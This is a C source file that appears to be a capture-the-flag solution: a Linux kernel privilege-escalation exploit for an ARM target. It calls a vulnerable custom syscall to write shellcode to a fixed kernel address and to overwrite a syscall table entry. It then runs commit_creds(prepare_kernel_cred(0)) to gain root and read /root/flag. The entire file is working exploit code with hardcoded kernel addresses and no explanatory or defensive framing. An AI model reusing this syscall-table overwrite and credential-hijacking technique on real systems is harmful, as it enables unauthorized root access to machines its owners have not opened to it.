#include <stdio.h>
#include <sys/syscall.h>

#define SYS_CALL_TABLE 0x8000e348
#define NR_SYS_VULN  223

int (*commit_creds)(void *) = (void *)0x8003f56c;
void *(*prepare_kernel_cred)(void *) = (void *)0x8003f924;


void get_root() {
    (*commit_creds)((*prepare_kernel_cred)(0));  
}

int main(int argc, const char *argv[])
{
    char flag[128];
    void *target = (void*) 0x82ffbabe;  
    void *syscall_addr = (void*) 0x8000e6c4;  
    char target_addr[] = "\xbe\xba\xff\x82";  

    char shellcode[0xa0] = "\xf0\x4f\x2d\xe9\x30\xff"  
                           "\x2f\xe1\xf0\x4f\xbd\xe8"
                           "\x1e\xff\x2f\xe1";

    /*
     * copy shellcode to target addr
     */
    syscall(NR_SYS_VULN, shellcode, target);

    /*
     * over-writing target syscall addr with target_addr
     */
    syscall(NR_SYS_VULN, target_addr, syscall_addr);  

    /*
     * invode to get root
     */
    syscall(NR_SYS_VULN, get_root);  

    /*
     * try to open file and read , for not allowd to spawn a shell directly
     */
    FILE * fp = fopen("/root/flag","r");
    fgets(flag, 128, fp);
    printf("[+] Flag: %s", flag);
    fclose(fp);

    return 0;
}
